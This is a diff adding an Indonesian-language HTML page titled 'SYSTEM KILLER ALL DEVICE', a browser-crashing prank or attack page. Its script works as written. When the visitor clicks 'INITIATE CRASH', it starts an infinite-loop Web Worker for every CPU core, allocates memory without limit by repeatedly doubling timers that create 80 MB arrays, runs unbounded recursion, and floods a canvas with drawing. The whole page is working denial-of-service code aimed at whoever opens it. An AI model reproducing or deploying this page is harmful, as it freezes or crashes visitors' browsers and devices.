@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM KILLER ALL DEVICE BY @XYCoolcraft</title>
+    <style>
+        body, html { margin: 0; padding: 0; overflow: hidden; background: black; height: 100%; }
+        canvas { display: block; }
+        #overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.8); color: red; font-family: monospace; z-index: 10;
+        }
+        h1 { font-size: 3rem; text-shadow: 0 0 10px red; text-align: center; }
+        button {
+            padding: 20px 50px; font-size: 2rem; background: red; color: white;
+            border: 2px solid white; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 30px red; animation: pulse 0.5s infinite;
+        }
+        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.1);} 100% {transform: scale(1);} }
+    </style>
+</head>
+<body>
+
+    <canvas id="canvas"></canvas>
+
+    <div id="overlay">
+        <h1>🔥🔪⚙️ SYSTEM KILLER ALL DEVICE🔥🔪⚙️</h1>
+        <p>WARNING: MAY CAUSE IMMEDIATE CRASH</p>
+        <button onclick="killSystem()">INITIATE CRASH</button>
+        <p id="logs">Status: Waiting...</p>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        let particles = [];
+        let crashArray = [];
+
+        function recursiveBomb(n) {
+            if (n % 100 === 0) {
+
+                setTimeout(() => recursiveBomb(n + 1), 0);
+            }
+            Math.pow(Math.random(), Math.random());
+            recursiveBomb(n + 1); 
+        }
+
+        function eatMemoryBrutal() {
+            try {
+                const massiveChunk = new Float64Array(10000000).fill(Math.random());
+                crashArray.push(massiveChunk);
+                
+                document.getElementById('logs').innerText = "RAM LEAK: " + (crashArray.length * 80) + " MB (Approximated)";
+                
+                setTimeout(eatMemoryBrutal, 0);
+                setTimeout(eatMemoryBrutal, 0);
+            } catch (e) {
+                document.getElementById('logs').innerText = "MEMORY FULL. SYSTEM UNSTABLE.";
+            }
+        }
+
+        function renderChaos() {
+
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            for (let i = 0; i < 5000; i++) {
+                const x = Math.random() * canvas.width;
+                const y = Math.random() * canvas.height;
+                const size = Math.random() * 50;
+                
+                ctx.beginPath();
+                ctx.arc(x, y, size, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(${Math.random()*255},0,0,0.8)`;
+                ctx.fill();
+                
+                ctx.font = "20px monospace";
+                ctx.fillStyle = "white";
+                ctx.fillText("CRASH", x, y);
+            }
+            
+            requestAnimationFrame(renderChaos);
+        }
+
+        function killSystem() {
+            const btn = document.querySelector('button');
+            btn.style.display = 'none';
+            document.getElementById('logs').innerText = "INJECTING PAYLOAD...";
+            document.getElementById('logs').style.color = "red";
+
+            renderChaos();
+
+            const cores = navigator.hardwareConcurrency || 8;
+            const workerCode = `self.onmessage=()=>{while(true){Math.random()**Math.random()}}`;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            for(let i=0; i<cores; i++) {
+                new Worker(url).postMessage('start');
+            }
+
+            setTimeout(() => {
+                eatMemoryBrutal();
+                try { recursiveBomb(0); } catch(e) {}
+            }, 500);
+        }
+    </script>
+</body>
+</html>
